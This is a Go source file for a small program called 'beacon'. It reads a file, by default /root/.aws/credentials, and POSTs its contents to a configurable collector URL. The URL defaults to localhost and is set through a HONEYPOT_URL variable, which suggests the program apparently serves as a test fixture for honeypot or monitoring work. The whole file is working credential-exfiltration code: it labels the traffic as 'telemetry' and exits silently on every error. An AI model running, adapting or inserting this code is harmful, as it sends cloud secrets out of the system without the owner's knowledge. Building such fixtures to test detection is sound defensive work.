// beacon — HTTP POST a target file to a collector URL.
//
// Env vars (all optional; defaults intended only for local tests):
//   HONEYPOT_URL   destination URL for the POST
//   PAYLOAD_PATH   file whose bytes form the request body
//   LABEL          X-Agent-Label header value
//   TIMEOUT_S      per-request timeout in seconds (integer string)
//
// Side effects: one HTTP(S) POST. Unreadable PAYLOAD_PATH → exit 0.
// Network error → exit 0. Only genuine programmer bugs should ever
// produce a non-zero exit.
package main

import (
	"bytes"
	"net/http"
	"os"
	"strconv"
	"time"
)

func envOr(key, def string) string {
	if v, ok := os.LookupEnv(key); ok && v != "" {
		return v
	}
	return def
}

func run() int {
	url := envOr("HONEYPOT_URL", "http://127.0.0.1:9999/collect")
	path := envOr("PAYLOAD_PATH", "/root/.aws/credentials")
	label := envOr("LABEL", "telemetry")
	timeoutS, _ := strconv.Atoi(envOr("TIMEOUT_S", "5"))
	if timeoutS <= 0 {
		timeoutS = 5
	}

	body, err := os.ReadFile(path)
	if err != nil {
		return 0
	}

	client := &http.Client{Timeout: time.Duration(timeoutS) * time.Second}
	req, err := http.NewRequest(http.MethodPost, url, bytes.NewReader(body))
	if err != nil {
		return 0
	}
	req.Header.Set("X-Agent-Label", label)
	req.Header.Set("Content-Type", "application/octet-stream")
	resp, err := client.Do(req)
	if err != nil {
		return 0
	}
	_ = resp.Body.Close()
	return 0
}

func main() { os.Exit(run()) }
